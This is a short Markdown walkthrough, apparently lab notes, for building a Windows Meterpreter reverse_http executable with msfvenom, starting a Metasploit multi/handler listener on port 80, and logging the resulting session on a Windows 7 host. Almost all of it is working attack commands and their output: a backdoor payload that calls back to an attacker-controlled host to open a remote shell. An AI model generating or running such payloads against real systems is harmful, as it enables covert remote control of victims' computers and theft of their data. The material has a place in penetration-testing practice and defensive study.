# Metasploit
## Reference
* http://eldeeb.net/wrdprs/?p=11

## Step 1: Creating EXE
```
msfvenom -p windows/meterpreter/reverse_http -f exe LHOST=192.168.80.138 LPORT=80 X > met_rev_http_80.exe                                                  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 545 bytes


file met_rev_http_80.exe
met_rev_http_80.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit

```

## Step 2: Listener
```
msf > use exploit/multi/handler
msf  exploit(handler) > set PAYLOAD windows/meterpreter/reverse_http
PAYLOAD => windows/meterpreter/reverse_http

msf  exploit(handler) > set LPORT 80
LPORT => 80

msf  exploit(handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0

msf  exploit(handler) > exploit -j -z
[*] Exploit running as background job.
[*] Started HTTP reverse handler on http://0.0.0.0:80/
[*] Starting the payload handler...
```

## Logging
```
msf  exploit(handler) >
[*] 192.168.80.1:10214 Request received for /INITM...
Win32: /INITM
[*] 192.168.80.1:10214 Staging connection for target /INITM received...
[*] Patched transport at offset 486516...
[*] Patched URL at offset 486248...
[*] Patched Expiration Timeout at offset 641856...
[*] Patched Communication Timeout at offset 641860...
[*] Meterpreter session 1 opened (192.168.80.138:80 -> 192.168.80.1:10214) at 2012-05-13 23:40:36 -0400

msf  exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DMZ-07
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64 (Current Process is WOW64)
System Language : en_US
Meterpreter     : x86/win32

meterpreter >

```

